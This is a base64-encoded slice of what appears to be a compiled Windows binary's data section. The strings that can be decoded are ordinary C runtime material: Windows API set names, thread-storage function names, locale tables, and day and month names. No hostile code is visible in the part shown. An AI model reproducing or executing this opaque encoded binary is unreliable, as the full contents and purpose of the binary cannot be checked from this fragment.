AAAAAGBsb2NhbCBzdGF0aWMgdGhyZWFkIGd1YXJkJwAAAAAAb3BlcmF0b3IgIiIgAAAAAG9wZXJhdG9yIGNvX2F3YWl0AAAAAAAAAG9wZXJhdG9yPD0+AAAAAAAgVHlwZSBEZXNjcmlwdG9yJwAAAAAAAAAgQmFzZSBDbGFzcyBEZXNjcmlwdG9yIGF0ICgAAAAAACBCYXNlIENsYXNzIEFycmF5JwAAAAAAACBDbGFzcyBIaWVyYXJjaHkgRGVzY3JpcHRvcicAAAAAIENvbXBsZXRlIE9iamVjdCBMb2NhdG9yJwAAAAAAAABgYW5vbnltb3VzIG5hbWVzcGFjZScAAADQ4wFAAQAAABDkAUABAAAAUOQBQAEAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAGYAaQBiAGUAcgBzAC0AbAAxAC0AMQAtADEAAAAAAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBzAHkAbgBjAGgALQBsADEALQAyAC0AMAAAAAAAAAAAAGsAZQByAG4AZQBsADMAMgAAAAAAAAAAAGEAcABpAC0AbQBzAC0AAAAAAAAAAgAAAEZsc0FsbG9jAAAAAAAAAAAAAAAAAgAAAEZsc0ZyZWUAAAAAAAIAAABGbHNHZXRWYWx1ZQAAAAAAAAAAAAIAAABGbHNTZXRWYWx1ZQAAAAAAAQAAAAIAAABJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgAAAAAAG0AcwBjAG8AcgBlAGUALgBkAGwAbAAAAENvckV4aXRQcm9jZXNzAAAAAAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAYAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAIAAAABAAAAAAAAAAAAAAAEAAAABAAAAAUAAAAEAAAABQAAAAQAAAAFAAAAAAAAAAUAAAAAAAAABQAAAAAAAAAFAAAAAAAAAAUAAAAAAAAABQAAAAMAAAAFAAAAAwAAAAAAAAAAAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAACAAAAAIAAAAAAAAAAwAAAAgAAAAFAAAAAAAAAAUAAAAIAAAAAAAAAAcAAAAAAAAACAAAAAAAAAAAAAAAAwAAAAcAAAADAAAAAAAAAAMAAAAAAAAABQAAAAcAAAAFAAAAAAAAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAAAAAACAAAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAGAAAAAAAAAAYAAAAIAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAAAgAAAAHAAAAAAAAAAcAAAAIAAAABwAAAAgAAAAHAAAACAAAAAcAAAAIAAAAAAAAAAgAAAAAAAAABwAAAAAAAAAIAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAABwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAABwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAYAAAAIAAAAAAAAAAgAAAABAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAwAAAAgAAAAGAAAACAAAAAAAAAAIAAAABgAAAAgAAAACAAAACAAAAAAAAAABAAAABAAAAAAAAAAFAAAAAAAAAAUAAAAEAAAABQAAAAQAAAAFAAAABAAAAAUAAAAIAAAABQAAAAgAAAAFAAAACAAAAAUAAAAAAAAABQAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAACAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAACAAAACAAAAAIAAAAHAAAAAwAAAAgAAAAFAAAAAAAAAAUAAAAHAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAAAAAAADAAAABwAAAAMAAAAAAAAAAwAAAAAAAAAFAAAAAAAAAAUAAAAAAAAACAAAAAgAAAAAAAAABwAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAIAAAACAAAAAAAAAAIAAAACAAAAAgAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAIAAAABgAAAAAAAAAGAAAACAAAAAYAAAAIAAAABgAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAcAAAAHAAAACAAAAAcAAAAHAAAABwAAAAAAAAAHAAAABwAAAAcAAAAAAAAABwAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAcAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAbgB1AGwAbAApAAAAAAAobnVsbCkAACIFkxkBAAAA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